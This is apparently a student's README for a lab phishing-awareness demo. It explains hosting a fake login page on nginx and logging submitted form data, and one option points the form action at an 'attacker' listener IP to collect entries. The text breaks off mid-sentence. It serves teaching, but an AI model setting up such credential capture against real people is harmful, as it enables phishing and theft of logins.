# phishing_awareness

Phishing Awareness (Lab Demo)

**Intern:** Muhammad Faisal  
**Date:** 2025-09-30  

---

## Purpose
This folder contains a safe, educational phishing demonstration page and artifacts for the CodeAlpha internship. The page is intentionally simple and designed for lab-controlled testing only — **do not** use real production credentials or deploy this on public systems.

The demo teaches:
- How phishing pages often look and behave
- Quick manual checks (hover links, inspect form actions)
- How to unshorten links and inspect TLS certificates
- Capturing and redacting any submitted test data (lab only)

---

## Files included
- `phishing_demo.html` — static demo page (lab demo).  
- `artifacts/` — (empty by default) place for captured/redacted logs and outputs.  
- `screenshots/` — placeholder for screenshots (phishing_page.png, phishing_hover.png, etc.).  
- `videos/phishing_demo.mp4` — demo recording (optional).  
- `Phishing_Awareness_Expanded_Muhammad_Faisal.pptx` — presentation used for awareness/demo.  
- `TASK2_STATUS.md` — task status and commands run.

---

## How to host the demo (on the **target** machine)
> Run on the lab **target** instance (13.60.156.138) only.

1. Install nginx (if not already):
```bash
##sudo apt update && sudo apt -y install nginx

2. Copy phishing_demo.html to the web root:



sudo cp phishing_demo.html /var/www/html/phishing_demo.html
sudo systemctl restart nginx
# verify:
curl -I http://localhost/phishing_demo.html

3. Open in your browser (from your laptop):



http://13.60.156.138/phishing_demo.html


---

How to capture submitted data (lab-only; two options)

Option A — Capture on the target

Run a simple HTTP logger on the target that listens on port 9000 and logs POST bodies (Python script provided in task instructions). Example (server on target):

# Start a basic logger (example)
sudo nohup python3 ~/codealpha/TASKS/logging_server.py >/home/ubuntu/codealpha/TASKS/logging_server.log 2>&1 &
# Submit the form from the browser (use dummy data)
# Then inspect:
tail -n 80 /home/ubuntu/codealpha/TASKS/artifacts/phish_submissions_raw.txt

Option B — Capture on the attacker (attacker sees submissions)

Change the form action in phishing_demo.html to the attacker's listener:

<form method="post" action="http://13.6.208.177:9000/log">

Start the logger on the attacker (same approach) and watch the log there.

> Security note: If you change the action to an IP:port, ensure Security Group inbound is limited to lab IPs only (restrict to your tester IPs) and revert after the de
